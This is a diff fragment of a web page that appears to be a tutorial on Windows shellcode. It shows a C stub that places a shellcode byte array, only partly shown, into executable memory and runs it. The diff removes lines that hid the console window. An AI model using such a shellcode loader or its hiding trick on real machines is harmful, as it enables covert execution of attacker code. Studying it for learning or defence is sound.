@@ -1141,8 +1141,6 @@ In order to execute the above shellcode, we should create a STUB program in C wh
 <pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 14px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 
 #include &lt;windows.h>
-#include &lt;iostream>
-#include &lt;stdlib.h>
 
 char code[] = 
 "\x31\xc9\x64\x8b\x41\x30\x8b\x40\x0c\x8b\x70\x14\xad\x96\xad\x96\xad\x8b"
@@ -1172,8 +1170,6 @@ char code[] =
 
 int main(int argc, char** argv)
 {
-  HWND hWnd = GetConsoleWindow();
-  ShowWindow(hWnd, SW_HIDE);
   void* exec = VirtualAlloc(0, strlen(code), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
   memcpy(exec, code, sizeof(code));
   ((void(*)())exec)();
